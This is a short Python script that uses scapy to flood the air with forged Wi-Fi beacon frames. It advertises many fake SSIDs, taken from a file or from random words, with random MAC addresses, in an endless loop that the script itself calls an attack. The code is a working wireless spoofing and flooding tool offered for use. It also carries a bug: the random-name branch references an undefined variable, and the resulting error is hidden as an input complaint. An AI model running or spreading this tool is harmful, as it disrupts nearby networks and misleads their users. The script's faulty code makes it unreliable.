import argparse
import subprocess
import threading
import time
import curses
import datetime
import sys
from chance import chance
from scapy.all import *
#source : https://stackoverflow.com/questions/15318208/capture-control-c-in-python
#source : https://github.com/davitv/chance
print("Beacons generation with names from a file or randomly generated, use CTRL+C to quit or stop the attack.")
try:
    parser = argparse.ArgumentParser(description="This scrips is used to generate false SSID, the SSID names come from a file or are randomly generated.")
    parser.add_argument("-f", "--file",type=str, help="The file containing the desired names.")
    parser.add_argument("-i", "--interface", required=True, help="The interface to use")
    arguments = parser.parse_args()
    packets = []
    #If no file is specified using the -f option, we ask the user for a number
    if(arguments.file is None):
            try:
                nbSSID = int(input("Please enter the number of different SSID you want to have.\n"))
                for i in range(0,nbSSID):
                    #Creation of the beacons packet using a random src MAC and the broadcat MAC as destination. The name is random.
                    src = RandMAC()
                    name = chance.word(language="en")
                    packets.append(RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=src, addr3=src) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=nom) / Dot11Elt())
                    print("One Wifi should be visible with the name :",name)
            #The application exit if the user does not provide a number.
            except:
                print("Please, enter a number!")
                sys.exit()
    #If a file is provided, each line is a new wifi name.
    else:   
        files = open(arguments.file,"r")
        lines = files.readlines()
        for line in lines:
            src = RandMAC()
            packets.append(RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=src, addr3=src) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=line) / Dot11Elt())
            print("One Wifi should be visible with the name :",line)
    #Once we got our beacons list, we loop indefinitely on it to send beacons.
    while(1):
        for packet in packets:
            sendp(packet,inter=0.000001, iface=arguments.interface, verbose=0)
except KeyboardInterrupt:
    print("\nBye!")
    sys.exit()